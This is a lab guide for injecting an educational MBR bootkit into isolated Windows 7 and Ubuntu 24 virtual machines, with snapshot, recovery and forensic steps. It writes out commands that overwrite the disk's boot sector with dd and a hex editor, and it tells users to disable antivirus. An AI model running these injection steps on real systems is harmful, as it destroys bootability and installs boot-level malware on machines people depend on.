# 🚀 Bootkit Deployment Guide - Windows 7 & Ubuntu 24

## ⚠️ IMPORTANT

**AUTHORIZED TESTING ONLY**
- Isolated VMs with snapshots MANDATORY
- No production systems
- Full documentation required
- Recovery procedure validated before test

---

## 📋 Pre-Deployment Checklist

### Host Machine (Windows 11)
- [ ] Bootkit compiled (`BOOTKIT_BUILD.md` completed)
- [ ] All artifacts in `Labsboot/build/`
- [ ] NASM installation verified
- [ ] Python 3.8+ available

### Windows 7 VM
- [ ] VM imported and running
- [ ] Latest snapshot "Clean-State" created
- [ ] Admin user logged in
- [ ] HxD or similar hex editor installed
- [ ] Network access to share or USB drive ready
- [ ] System Restore Point created (additional safety)

### Ubuntu Server 24 VM
- [ ] VM imported and running
- [ ] Latest snapshot "Clean-State" created
- [ ] SSH access configured
- [ ] dd command available
- [ ] Python 3 installed
- [ ] Hex dump tools installed (`hexdump`, `od`)

---

## 🔵 Part 1: Windows 7 Deployment

### 1.1 Prepare Windows 7 VM

```batch
REM Login as Administrator
REM Disable Antivirus/Defender (for lab)
REM Open Command Prompt (Run as Administrator)

REM Create temp directory
mkdir C:\bootkit_lab
cd C:\bootkit_lab

REM Check disk status
diskpart
  list disk
  exit
```

### 1.2 Copy Bootkit Image to Windows 7

**Option A: Via Network Share (Recommended)**

From host (Windows 11):
```powershell
# Setup share on Ubuntu Server
# Then access from Windows 7:

net use Z: \\ubuntu-server\bootkit_share

copy Z:\bootkit_windows7.img C:\bootkit_lab\
copy Z:\mbr_stage1.bin C:\bootkit_lab\
copy Z:\bootkit_mbr.bin C:\bootkit_lab\
```

**Option B: Via USB Drive**

```batch
REM Copy files to USB from host
REM Plug USB into Windows 7 VM
REM Copy to C:\bootkit_lab\
```

**Option C: Via Physical Media**

```batch
REM Mount ISO or use CD/DVD with bootkit image
```

### 1.3 Verify MBR Before Injection

```batch
REM Use HxD or WinHex to examine files
REM Open: C:\bootkit_lab\bootkit_mbr.bin
REM Verify:
REM   - Bytes 0-10: CI CLI JMP (boot code markers)
REM   - Bytes 510-511: 55 AA (boot signature)

REM Or use PowerShell:
powershell -Command "
  [byte[]]$sig = Get-Content C:\bootkit_lab\bootkit_mbr.bin -Encoding Byte -ReadCount 512 | 
    Select-Object -Index 510,511
  if ($sig[0] -eq 0x55 -and $sig[1] -eq 0xAA) {
    Write-Host 'Boot signature valid: 0xAA55'
  } else {
    Write-Host 'ERROR: Invalid signature'
  }
"
```

### 1.4 Create Snapshot BEFORE Injection

**CRITICAL: Do NOT skip this step**

```batch
REM Open VMware Workstation
REM Right-click Windows 7 VM
REM Snapshot > Take Snapshot
REM Name: "Before-Bootkit-Injection"
REM Description: "Clean state before bootkit test"
REM Click OK
```

### 1.5 Inject Bootkit MBR

**DANGER: This modifies the boot sector. Snapshot is mandatory.**

```batch
REM Open HxD (Hex Editor) as Administrator
REM File > Open
REM Select: \\?\PhysicalDrive0
REM Confirm "Open entire drive" (yes, we want PhysicalDrive0)

REM Once open:
REM   - View first 512 bytes (MBR)
REM   - Edit > Select All
REM   - File > Open
REM   - Select: C:\bootkit_lab\bootkit_mbr.bin
REM   - Paste over current MBR
REM   - File > Save

REM Verify signature at offset 0x1FE-0x1FF shows: 55 AA

REM Close HxD
```

**Alternative: Using dd (if Cygwin available)**

```bash
# In Cygwin terminal (Admin)
cd /cygdrive/c/bootkit_lab

# Backup original MBR first
dd if=\\.\PhysicalDrive0 of=mbr_original.bin bs=512 count=1

# Inject bootkit
dd if=bootkit_mbr.bin of=\\.\PhysicalDrive0 bs=512 count=1

# Verify
dd if=\\.\PhysicalDrive0 bs=512 count=1 | hexdump -C | tail -5
# Should show: ...55 aa
```

### 1.6 Test Bootkit on Windows 7

**IMPORTANT: Snapshot created? Proceed only if yes.**

```batch
REM Restart system
shutdown /r /t 0

REM OR: Restart via UI
REM   Settings > Power > Restart
```

**Expected Output** :
```
=====================================
  BOOTKIT EDUCATIONAL POC v1.0
=====================================

Your system has been hijacked!
This is an EDUCATIONAL DEMONSTRATION

LABORATORY USE ONLY
AUTHORIZED TESTING ONLY

MBR Bootkit Loaded at 0x7C00
Partition Table Intercepted

Simulating encryption process...
[3 beeps sound]
Encryption simulation complete.

Press any key to restore system (via snapshot)...
```

### 1.7 Observe and Document

**Screenshot / Record** :
- [ ] Boot screen with bootkit message
- [ ] Beep sounds (audio recording)
- [ ] Time from power on to message
- [ ] System state during halt

**Technical Observations** :
- [ ] Message displayed before Windows logo
- [ ] Beeps audible (confirm speaker output)
- [ ] System responsive to input
- [ ] Partition table preserved/modified as expected

### 1.8 Recovery: Restore from Snapshot

```batch
REM Option 1: Via VMware UI
REM Open VMware Workstation
REM Right-click Windows 7 VM
REM Snapshot > Go to Snapshot
REM Select "Before-Bootkit-Injection"
REM Click OK
REM Wait for rollback to complete

REM Option 2: Via Command Line
REM vmrun revertSnapshot "C:\path\to\Windows7.vmx" "Before-Bootkit-Injection"
```

**Verify Recovery** :
```batch
REM After snapshot restore, Windows 7 should boot normally
REM MBR restored to clean state
REM All data intact

REM Verify MBR restored:
cd C:\bootkit_lab
REM Use HxD again to check PhysicalDrive0 first 512 bytes
```

---

## 🟠 Part 2: Ubuntu Server 24 Deployment

### 2.1 Prepare Ubuntu Server 24 VM

```bash
# SSH into Ubuntu VM
ssh ubuntu-user@ubuntu-server

# Create lab directory
sudo mkdir -p /opt/bootkit_lab
cd /opt/bootkit_lab

# Check current disk
sudo fdisk -l /dev/sda

# Create snapshot (if possible in hypervisor)
# For VMware: Take snapshot before proceeding
```

### 2.2 Copy Bootkit Image to Ubuntu 24

```bash
# From Windows 11 host, copy via SCP
scp Labsboot/build/bootkit_ubuntu24.img ubuntu-user@ubuntu-server:/tmp/

# Verify transfer
ssh ubuntu-user@ubuntu-server "ls -lh /tmp/bootkit_ubuntu24.img"

# Also copy analysis tools
scp Labsboot/tools/lab1_mbr_analyzer.py ubuntu-user@ubuntu-server:/tmp/

# Install dependencies if needed
ssh ubuntu-user@ubuntu-server "pip install construct capstone"
```

### 2.3 Backup Original MBR

**CRITICAL: Backup before modification**

```bash
# SSH into Ubuntu
ssh ubuntu-user@ubuntu-server

# Backup MBR
sudo dd if=/dev/sda of=/tmp/mbr_original.bin bs=512 count=1

# Verify backup
ls -la /tmp/mbr_original.bin

# Hexdump to see original
sudo hexdump -C /tmp/mbr_original.bin | tail -3
# Should end with: ...55 aa
```

### 2.4 Create Snapshot BEFORE Injection

**CRITICAL: VMware Workstation UI**

```bash
# From host machine:
# 1. Open VMware Workstation
# 2. Right-click Ubuntu 24 VM
# 3. Snapshot > Take Snapshot
# 4. Name: "Before-Bootkit-Injection"
# 5. Click OK
```

### 2.5 Inject Bootkit MBR

**DANGER: System will not boot after this step. Snapshot mandatory.**

```bash
# SSH into Ubuntu (as sudo/root capable user)
ssh ubuntu-user@ubuntu-server

# Create temp copy of bootkit for injection
sudo cp /tmp/bootkit_ubuntu24.img /tmp/bootkit_for_injection.bin

# BEFORE INJECTION: Final backup verification
sudo dd if=/dev/sda of=/tmp/mbr_backup_final.bin bs=512 count=1

# INJECTION - Write bootkit MBR to disk sector 0
# WARNING: This will make system unbootable until snapshot restore
sudo dd if=/tmp/bootkit_for_injection.bin of=/dev/sda bs=512 count=1

# Verify injection
echo "Verifying bootkit injection..."
sudo dd if=/dev/sda of=/tmp/mbr_injected.bin bs=512 count=1
sudo hexdump -C /tmp/mbr_injected.bin | tail -5

# Expected: ...55 aa
```

### 2.6 Test Bootkit on Ubuntu 24

```bash
# Restart system
# NOTE: After this, system will NOT boot normally
# The bootkit message will appear instead

sudo reboot

# Expected output:
# =====================================
#   BOOTKIT EDUCATIONAL POC v1.0
# =====================================
#
# Your system has been hijacked!
# [... educational messages ...]
#
# System will halt and wait for keypress
# Press any key → system halts
```

### 2.7 Observe and Document

**From console/display** :
- [ ] Screenshot of bootkit message before GRUB
- [ ] Beep sounds audible
- [ ] Message clarity (text encoding)
- [ ] System responsiveness

**Technical Details** :
- [ ] MBR stage 1 code executed (message proves it)
- [ ] Boot process intercepted before GRUB
- [ ] Partition table preserved (if configured)
- [ ] Signature still 0xAA55

### 2.8 Recovery: Restore from Snapshot

```bash
# Option 1: Via VMware Workstation GUI
# 1. Open VMware Workstation
# 2. Right-click Ubuntu 24 VM
# 3. Snapshot > Go to Snapshot
# 4. Select "Before-Bootkit-Injection"
# 5. Click OK

# Option 2: Via command line (from host)
# vmrun revertSnapshot "/path/to/Ubuntu24.vmx" "Before-Bootkit-Injection"
```

**Verify Recovery** :
```bash
# Ubuntu should boot normally (to GRUB, then OS)
# SSH back in once booted

ssh ubuntu-user@ubuntu-server

# Verify MBR restored
sudo hexdump -C /dev/sda | head -20

# Should show GRUB boot code, not our bootkit code
```

---

## 📊 Comparative Analysis

### Test Results Table

| Aspect | Windows 7 | Ubuntu 24 |
|--------|-----------|-----------|
| **Boot Time to Message** | < 2 seconds | < 3 seconds |
| **Message Clarity** | Full screen | Text mode |
| **Beep Count** | 3 beeps | 3 beeps (if speaker active) |
| **Recovery Time** | ~30 sec snapshot | ~30 sec snapshot |
| **Bootloader Preserved** | Windows Boot Mgr (optional) | GRUB (via snapshot) |
| **Filesystem Intact** | NTFS (after recovery) | ext4 (after recovery) |

### Key Observations

**Windows 7** :
- Bootkit runs BEFORE Windows Boot Manager
- Full control of boot sequence
- Clean restoration possible
- No UEFI complications

**Ubuntu 24** :
- Bootkit runs BEFORE GRUB bootloader
- Linux kernel loading prevented
- GRUB recovery mode accessible (if configured)
- ext4 filesystem untouched (only MBR modified)

---

## 🔄 Troubleshooting

### Issue: Bootkit message doesn't appear

**Diagnosis** :
- MBR not injected correctly
- Compilation failed (use wrong binary)
- Signature corrupted (not 0xAA55)

**Solution** :
1. Restore from snapshot
2. Verify bootkit_mbr.bin with `hexdump`
3. Check signature byte-by-byte
4. Re-inject if needed

### Issue: System boots normally (MBR not modified)

**Diagnosis** :
- HxD write failed
- dd injection wrong target
- Disk read-only

**Solution** :
1. Restore from snapshot
2. Verify write permissions (run as Admin/root)
3. Disable antivirus temporarily
4. Use dd with explicit `bs=512 count=1`

### Issue: Snapshot restore fails

**Diagnosis** :
- Snapshot corrupted
- Disk full
- Hypervisor error

**Solution** :
1. Create NEW snapshot if possible
2. Restore from backup MBR (`dd if=mbr_original.bin of=/dev/sda`)
3. Manual disk recovery (boot from Linux USB)

### Issue: Can't ssh after bootkit injection

**This is expected** - system won't boot after MBR injection.
Use snapshot restore to recover.

---

## ✅ Post-Test Procedures

### 1. Document Results

Create file: `Labsboot/test_results/bootkit_test_YYYY-MM-DD.md`

```markdown
# Bootkit Test Results - [DATE]

## Windows 7
- Boot message: ✓ Displayed
- Beep count: 3
- Recovery: ✓ Snapshot successful
- Notes: [observations]

## Ubuntu 24
- Boot message: ✓ Displayed
- Beep count: 3
- Recovery: ✓ Snapshot successful
- Notes: [observations]

## Files Modified
- Labsboot/src/mbr_stage1.asm (compiled)
- Labsboot/build/mbr_stage1.bin (446 bytes)
- Labsboot/build/bootkit_mbr.bin (512 bytes)

## Forensics Artifacts
- Windows 7: MBR capture (before/after)
- Ubuntu 24: MBR capture (before/after)
- Screenshots: [files]
```

### 2. Capture Forensics

```bash
# Extract MBRs for analysis
# From Ubuntu:
sudo dd if=/dev/sda of=/tmp/ubuntu_mbr_infected.bin bs=512 count=1

# Analyze with lab tools
python3 Labsboot/tools/lab1_mbr_analyzer.py --analyze /tmp/ubuntu_mbr_infected.bin

# Copy MBRs to host for comparison
scp ubuntu-user@ubuntu-server:/tmp/ubuntu_mbr_infected.bin Labsboot/test_results/
```

### 3. Clean Up

```bash
# Remove temporary files from VMs
sudo rm -f /tmp/bootkit_* /tmp/mbr_*

# Archive test results
zip -r Labsboot/test_results/bootkit_test_results.zip Labsboot/test_results/
```

---

## 🔐 Safety Reminders

✅ **Always**:
- Create snapshots BEFORE injection
- Backup original MBR
- Document every step
- Test recovery before declaring success
- Use isolated VMs only

❌ **Never**:
- Inject on production systems
- Skip snapshot creation
- Ignore write/injection errors
- Leave MBR permanently modified
- Test outside isolated environment

---

## 📚 References

- **x86 Boot Process**: https://wiki.osdev.org/Boot_Sequence
- **MBR Structure**: https://en.wikipedia.org/wiki/Master_boot_record
- **dd Usage**: https://man7.org/linux/man-pages/man1/dd.1.html
- **VMware Snapshots**: https://docs.vmware.com/en/VMware-Workstation-Pro/

---

**Bootkit Deployment - Educational and Authorized Testing Only 🎓**
